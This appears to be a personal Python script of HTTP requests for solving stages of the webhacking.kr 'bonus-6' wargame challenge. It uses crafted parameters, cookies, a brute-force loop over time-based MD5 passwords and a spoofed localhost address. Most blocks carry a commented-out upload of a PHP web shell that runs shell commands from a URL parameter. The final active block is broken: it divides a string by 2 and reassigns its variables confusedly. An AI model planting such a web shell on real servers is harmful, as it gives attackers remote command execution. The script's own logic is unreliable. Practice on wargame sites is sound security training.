import requests

# URL = "https://webhacking.kr/challenge/bonus-6/"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# headers = {'Cookie': 'PHPSESSID='+SESSION_ID}
# data = { "get": "hehe" }
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
# response = requests.post(URL, headers=headers, data=data)
# print(response.text)

# URL = "https://webhacking.kr/challenge/bonus-6/33.php"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# headers = {'Cookie': 'PHPSESSID='+SESSION_ID}
# data = { "post": "hehe", "post2": "hehe2" }
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
# response = requests.post(URL, headers=headers, data=data)
# print(response.text)

# URL = "https://webhacking.kr/challenge/bonus-6/33.php"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# headers = {'Cookie': 'PHPSESSID='+SESSION_ID}
# data = { "post": "hehe", "post2": "hehe2" }
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
# response = requests.get(URL+"?myip=212.8.250.238", headers=headers)
# print(response.text)

# import hashlib
# import time
# import random

# URL = "https://webhacking.kr/challenge/bonus-6/l4.php"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# headers = {'Cookie': 'PHPSESSID='+SESSION_ID}
# data = { "post": "hehe", "post2": "hehe2" }
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
# while(True):
#     for i in range(3,10):
#         password = hashlib.md5(str(int(time.time()) + i).encode()).hexdigest()
#         response = requests.get(URL + "?password=" + password, headers=headers)
#         print(f"send message {i}: " + response.text)
#         if "5.php" in response.text:
#             print("\n\n\nfound secret\n\n\n")
#             print(response.text)

# import hashlib
# import time
# import random

# URL = "https://webhacking.kr/challenge/bonus-6/md555.php"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# cookies = {'PHPSESSID':SESSION_ID, 'imcookie':"True"}

# data = { "impost": "True" }
# params = {"imget":True}
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}

# response = requests.post(URL,params=params,data=data, cookies=cookies)
# print(response.text)

# import hashlib
# import time
# import random

# URL = "https://webhacking.kr/challenge/bonus-6/gpcc.php"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# cookies = {'PHPSESSID':SESSION_ID, 'test':hashlib.md5("212.8.250.236".encode()).hexdigest()}

# data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
# # params = {"imget":True}
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}

# response = requests.post(URL,data=data, cookies=cookies)
# print(response.text)

    
# import hashlib
# import time
# import random

# URL = "https://webhacking.kr/challenge/bonus-6/wtff.php"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# cookies = {'PHPSESSID':SESSION_ID, 'test':hashlib.md5("212.8.250.236".encode()).hexdigest()}

# data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
# params = {"2128250236":"2128250236"}
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}

# response = requests.post(URL,params=params,data=data, cookies=cookies)
# print(response.text)

    
    
# import hashlib
# import time
# import random

# URL = "https://webhacking.kr/challenge/bonus-6/ipt.php"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# cookies = {'PHPSESSID':SESSION_ID, 'test':hashlib.md5("212.8.250.236".encode()).hexdigest()}

# data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
# params = {"addr":"127.0.0.1"}
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}

# response = requests.post(URL,params=params,data=data, cookies=cookies)
# print(response.text)

    
    
# import hashlib
# import time
# import random

# URL = "https://webhacking.kr/challenge/bonus-6/nextt.php"
# SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
# cookies = {'PHPSESSID':SESSION_ID, 'test':hashlib.md5("212.8.250.236".encode()).hexdigest()}

# data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
# answer=""
# for i in range(97,123,2):
#     answer +=chr(i)
# print(answer)
# params = {"ans":answer}
# # files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}

# response = requests.post(URL,params=params,data=data, cookies=cookies)
# print(response.text)

    
    
import hashlib
import time
import random

URL = "https://webhacking.kr/challenge/bonus-6/forfor.php"
SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
cookies = {'PHPSESSID':SESSION_ID, 'test':hashlib.md5("212.8.250.236".encode()).hexdigest()}

ip = "212.8.250.236"
# for i in range(len(ip)+1):
#     if i<=9:
#         ip = ip.replace(str(i), str(ord(str(i))))
#     else:
#         ip = ip.replace(str(i), str(ord("1"))+str(ord(str(i-10))))
# print(ip)
ip_after = "55153507551.56.5515353506.55155194"
ip_after = ip_after.replace('.', '')[:10]
answer = ip_after*2
answer = ip_after/2
answer = answer.replace('.', '')

# this is the final staff:
# answerip/27576753775_5515350755.php


data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
answer=""
for i in range(97,123,2):
    answer +=chr(i)
print(answer)
params = {"ans":answer}
# files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}

response = requests.post(URL,params=params,data=data, cookies=cookies)
print(response.text)

    

